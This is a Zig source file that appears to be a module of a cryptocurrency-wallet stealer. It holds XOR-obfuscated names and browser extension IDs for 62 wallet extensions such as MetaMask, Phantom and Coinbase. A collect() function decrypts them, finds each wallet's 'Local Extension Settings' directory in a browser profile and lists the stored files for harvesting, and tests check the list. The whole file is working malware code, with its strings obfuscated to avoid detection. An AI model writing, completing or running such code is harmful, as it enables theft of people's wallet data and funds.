const std = @import("std");
const hash = @import("../types/hash.zig");

pub const WalletDir = struct {
    name: []const u8,
    path: []const u8,
    files: [][]const u8,
};

const E = struct {
    pub const names = [62][]const u8{
        &hash.xorEncrypt("MetaMask"),
        &hash.xorEncrypt("Binance"),
        &hash.xorEncrypt("Coinbase"),
        &hash.xorEncrypt("Phantom"),
        &hash.xorEncrypt("Trust"),
        &hash.xorEncrypt("TronLink"),
        &hash.xorEncrypt("Ronin"),
        &hash.xorEncrypt("Keplr"),
        &hash.xorEncrypt("Yoroi"),
        &hash.xorEncrypt("MetaMask2"),
        &hash.xorEncrypt("ExodusWeb3"),
        &hash.xorEncrypt("Guarda Wallet"),
        &hash.xorEncrypt("TokenPocket"),
        &hash.xorEncrypt("Math"),
        &hash.xorEncrypt("Coin98"),
        &hash.xorEncrypt("Nifty"),
        &hash.xorEncrypt("TempleTezos"),
        &hash.xorEncrypt("SubWallet"),
        &hash.xorEncrypt("Talisman"),
        &hash.xorEncrypt("Zerion"),
        &hash.xorEncrypt("Rabby"),
        &hash.xorEncrypt("Core"),
        &hash.xorEncrypt("Pontem"),
        &hash.xorEncrypt("Petra"),
        &hash.xorEncrypt("Martian"),
        &hash.xorEncrypt("Fewcha"),
        &hash.xorEncrypt("Safepal"),
        &hash.xorEncrypt("Ton"),
        &hash.xorEncrypt("XDEFI"),
        &hash.xorEncrypt("Oxygen"),
        &hash.xorEncrypt("Nami"),
        &hash.xorEncrypt("Liquality"),
        &hash.xorEncrypt("Solflare"),
        &hash.xorEncrypt("OKX"),
        &hash.xorEncrypt("Wombat"),
        &hash.xorEncrypt("MaiarDeFi"),
        &hash.xorEncrypt("MEWCX"),
        &hash.xorEncrypt("Saturn"),
        &hash.xorEncrypt("TerraStation"),
        &hash.xorEncrypt("Ever"),
        &hash.xorEncrypt("iWallet"),
        &hash.xorEncrypt("KardiaChain"),
        &hash.xorEncrypt("BoltX"),
        &hash.xorEncrypt("Slope"),
        &hash.xorEncrypt("Sollet"),
        &hash.xorEncrypt("Starcoin"),
        &hash.xorEncrypt("XinPay"),
        &hash.xorEncrypt("Equal"),
        &hash.xorEncrypt("Finnie"),
        &hash.xorEncrypt("Mobox"),
        &hash.xorEncrypt("Crocobit"),
        &hash.xorEncrypt("Bitapp"),
        &hash.xorEncrypt("Swash"),
        &hash.xorEncrypt("Jaxx Liberty"),
        &hash.xorEncrypt("Venom"),
        &hash.xorEncrypt("Guarda"),
        &hash.xorEncrypt("Sui"),
        &hash.xorEncrypt("XMR.PT"),
        &hash.xorEncrypt("PaliWallet"),
        &hash.xorEncrypt("ICONex"),
        &hash.xorEncrypt("Harmony"),
        &hash.xorEncrypt("Guild"),
    };
    pub const ids = [62][]const u8{
        &hash.xorEncrypt("nkbihfbeogaeaoehlefnkodbefgpgknn"),
        &hash.xorEncrypt("fhbohimaelbohpjbbldcngcnapndodjp"),
        &hash.xorEncrypt("hnfanknocfeofbddgcijnmhnfnkdnaad"),
        &hash.xorEncrypt("bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        &hash.xorEncrypt("egjidjbpglichdcondbcbdnbeeppgdph"),
        &hash.xorEncrypt("ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        &hash.xorEncrypt("fnjhmkhhmkbjkkabndcnnogagogbneec"),
        &hash.xorEncrypt("dmkamcknogkgcdfhhbddcghachkejeap"),
        &hash.xorEncrypt("ffnbelfdoeiohenkjibnmadjiehjhajb"),
        &hash.xorEncrypt("ejbalbakoplchlghecdalmeeeajnimhm"),
        &hash.xorEncrypt("aholpfdialjgjfhomihkjbmgjidlcdno"),
        &hash.xorEncrypt("fcglfhcjfpkgdppjbglknafgfffkelnm"),
        &hash.xorEncrypt("mfgccjchihfkkindfppnaooecgfneiii"),
        &hash.xorEncrypt("afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        &hash.xorEncrypt("aeachknmefphepccionboohckonoeemg"),
        &hash.xorEncrypt("jbdaocneiiinmjbjlgalhcelgbejmnid"),
        &hash.xorEncrypt("ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        &hash.xorEncrypt("onhogfjeacnfoofkfgppdlbmlmnplgbn"),
        &hash.xorEncrypt("fijngjgcjhjmmpcmkeiomlglpeiijkld"),
        &hash.xorEncrypt("klghhnkeealcohjlanjjlneabhbmpfpl"),
        &hash.xorEncrypt("acmacodkjbdgnolefmlmkchkdgmemhob"),
        &hash.xorEncrypt("agoakfejjabomempkjlepdflaleeobhb"),
        &hash.xorEncrypt("phkbamefinggmakgklpkljjmgibohnba"),
        &hash.xorEncrypt("ejjladinnckdgjemekebdpeokbikhfci"),
        &hash.xorEncrypt("efbglgofoippbgcjepnhiblaibcnclgk"),
        &hash.xorEncrypt("ebfidpplhabeedpnhjnobghokpiioolj"),
        &hash.xorEncrypt("lgmpcpglpngdoalbgeoldeajfclnhafa"),
        &hash.xorEncrypt("nphplpgoakhhjchkkhmiggakijnkhfnd"),
        &hash.xorEncrypt("hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        &hash.xorEncrypt("fhilaheimglignddkjgofkcbgekhenbh"),
        &hash.xorEncrypt("lpfcbjknijpeeillifnkikgncikgfhdo"),
        &hash.xorEncrypt("kpfopkelmapcoipemfendmdcghnegimn"),
        &hash.xorEncrypt("bhhhlbepdkbapadjdnnojkbgioiodbic"),
        &hash.xorEncrypt("mcohilncbfahbmgdjkbpemcciiolgcge"),
        &hash.xorEncrypt("amkmjjmmflddogmhpjloimipbofnfjih"),
        &hash.xorEncrypt("dngmlblcodfobpdpecaadgfbcggfjfnm"),
        &hash.xorEncrypt("nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        &hash.xorEncrypt("nkddgncdjgjfcddamfgcmfnlhccnimig"),
        &hash.xorEncrypt("aiifbnbfobpmeekipheeijimdpnlpgpp"),
        &hash.xorEncrypt("cgeeodpfagjceefieflmdfphplkenlfk"),
        &hash.xorEncrypt("kncchdigobghenbbaddojjnnaogfppfj"),
        &hash.xorEncrypt("pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        &hash.xorEncrypt("aodkkagnadcbobfpggfnjeongemjbjca"),
        &hash.xorEncrypt("pocmplpaccanhmnllbbkpgfliimjljgo"),
        &hash.xorEncrypt("fhmfendgdocmcbmfikdcogofphimnkno"),
        &hash.xorEncrypt("mfhbebgoclkghebffdldpobeajmbecfk"),
        &hash.xorEncrypt("bocpokimicclpaiekenaeelehdjllofo"),
        &hash.xorEncrypt("blnieiiffboillknjnepogjhkgnoapac"),
        &hash.xorEncrypt("cjmkndjhnagcfbpiemnkdpomccnjblmj"),
        &hash.xorEncrypt("fcckkdbjnoikooededlapcalpionmalo"),
        &hash.xorEncrypt("pnlfjmlcjdjgkddecgincndfgegkecke"),
        &hash.xorEncrypt("fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
        &hash.xorEncrypt("cmndjbecilbocjfkibfbifhngkdmjgog"),
        &hash.xorEncrypt("cjelfplplebdjjenllpjcblmjkfcffne"),
        &hash.xorEncrypt("ojggmchlghnjlapmfbnjholfjkiidbch"),
        &hash.xorEncrypt("hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        &hash.xorEncrypt("opcgpfmipidbgpenhmajoajpbobppdil"),
        &hash.xorEncrypt("eigblbgjknlfbajkfhopmcojidlgcehm"),
        &hash.xorEncrypt("mgffkfbidihjpoaomajlbgchddlicgpn"),
        &hash.xorEncrypt("flpiciilemghbmfalicajoolhkkenfel"),
        &hash.xorEncrypt("fnnegphlobjdpkhecapkijjdkgcjhkib"),
        &hash.xorEncrypt("nanjmdknhkinifnkgdcggcfnhdaammmj"),
    };
    pub const ext_settings = hash.xorEncrypt("Local Extension Settings");
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn listFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();

    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }

    return try files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, browser_profile_path: []const u8) ![]WalletDir {
    var wallet_dirs = std.ArrayList(WalletDir).init(allocator);
    errdefer {
        for (wallet_dirs.items) |wd| {
            allocator.free(wd.name);
            allocator.free(wd.path);
            for (wd.files) |f| allocator.free(f);
            allocator.free(wd.files);
        }
        wallet_dirs.deinit();
    }

    var ext_settings_buf: [E.ext_settings.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_settings, &ext_settings_buf);

    inline for (0..62) |i| {
        const id_enc = E.ids[i];
        var id_buf: [id_enc.len]u8 = undefined;
        hash.xorDecrypt(id_enc, &id_buf);

        const ext_path = try std.fs.path.join(allocator, &[_][]const u8{ browser_profile_path, &ext_settings_buf, &id_buf });
        if (!dirExists(ext_path)) {
            allocator.free(ext_path);
            continue;
        }

        const files = listFiles(allocator, ext_path) catch |err| {
            allocator.free(ext_path);
            if (err == error.FileNotFound or err == error.NotDir or err == error.AccessDenied) continue;
            return err;
        };

        const ne = E.names[i];
        var name_buf: [ne.len]u8 = undefined;
        hash.xorDecrypt(ne, &name_buf);

        const name = try allocator.dupe(u8, &name_buf);
        errdefer allocator.free(name);
        try wallet_dirs.append(WalletDir{ .name = name, .path = ext_path, .files = files });
    }

    return try wallet_dirs.toOwnedSlice();
}

test "extension count" {
    try std.testing.expect(E.names.len == 62);
}

test "first extension is MetaMask" {
    var buf: [E.names[0].len]u8 = undefined;
    hash.xorDecrypt(E.names[0], &buf);
    try std.testing.expectEqualSlices(u8, "MetaMask", &buf);
}

test "last extension is Guild" {
    var buf: [E.names[61].len]u8 = undefined;
    hash.xorDecrypt(E.names[61], &buf);
    try std.testing.expectEqualSlices(u8, "Guild", &buf);
}

test "collect returns empty for nonexistent profile" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__");
    defer {
        for (result) |wd| {
            std.testing.allocator.free(wd.name);
            std.testing.allocator.free(wd.path);
            for (wd.files) |f| std.testing.allocator.free(f);
            std.testing.allocator.free(wd.files);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "dirExists returns false for nonexistent path" {
    try std.testing.expect(!dirExists("C:\\__nonexistent__dir__"));
}
